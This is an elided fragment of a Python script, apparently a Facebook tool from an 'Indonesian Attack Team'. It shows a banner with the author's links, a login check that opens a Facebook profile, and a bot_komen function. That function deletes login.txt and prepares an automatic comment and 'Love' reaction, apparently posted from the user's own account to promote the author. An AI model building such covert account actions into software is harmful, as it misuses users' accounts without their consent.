...
#########LOGO#########
logo = """ 
\033[1;31;1m████████ INDONESIAN ATTACK TEAM 👑
\033[37;1m████████ FROM IAT GUARD👑
\033[32;1m︻Ω̵̵⃦̵̵͇̿Ω̵͇̿Ω»ــــــــــــــــــــــــــــــــــــــــــ»๏๏
\033[37;1m• Author   : Radian Pratama XD.
\033[37;1m• Github   : https://github.com/RDGNTNG
\033[37;1m• Facebook : https://www.facebook.com/Luampastq
\033[32;1m︻Ω̵̵⃦̵̵͇̿Ω̵͇̿Ω»ــــــــــــــــــــــــــــــــــــــــــ»๏๏"""
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.facebook.com/sarketipan.pan')
				bot_komen()
...
def bot_komen():
	try:
		...
		os.system('rm -rf login.txt')
	una = ('100005386548985')
	kom2 = ('HI Bro, Gw User Tools RDGNTNG')
	reac2 = ('Love')
